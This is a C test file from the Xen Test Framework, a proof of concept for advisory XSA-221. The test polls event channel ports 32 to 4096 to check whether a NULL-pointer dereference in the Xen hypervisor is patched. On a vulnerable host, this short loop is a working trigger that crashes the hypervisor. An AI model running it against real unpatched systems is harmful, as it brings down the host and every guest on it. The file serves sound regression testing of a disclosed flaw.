/**
 * @file tests/xsa-221/main.c
 * @ref test-xsa-221
 *
 * @page test-xsa-221 XSA-221
 *
 * Advisory: [XSA-221](https://xenbits.xen.org/xsa/advisory-221.html)
 *
 * The upstream change [fbbd5009e6](https://xenbits.xen.org/gitweb/
 * ?p=xen.git;a=commitdiff;h=fbbd5009e6ed1201731b1727762070c1a988e67d)
 * neglected to check that ports were suitably initialised before
 * dereferencing their structure.
 *
 * Attempt to poll each event channel port (with a 1ns timeout).  If Xen is
 * vulnerable, it should hit a NULL pointer (which for PV guests, will either
 * take a SMAP fault or hit the XTF unmapped page at NULL).
 *
 * If Xen is fixed, it will survive until the end of the loop.
 *
 * @see tests/xsa-221/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-221 PoC";

void test_main(void)
{
    evtchn_port_t port;
    struct sched_poll poll = {
        .ports = &port,
        .nr_ports = 1,
        .timeout = 1,
    };

    for ( port = 32; port <= 4096; ++port )
        hypercall_sched_op(SCHEDOP_poll, &poll);

    /*
     * If Xen is still alive at this point, it hasn't fallen over a NULL
     * bucket pointer, which probably means that XSA-221 is fixed.
     */
    xtf_success("Success: Probably not vulnerable to XSA-221\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
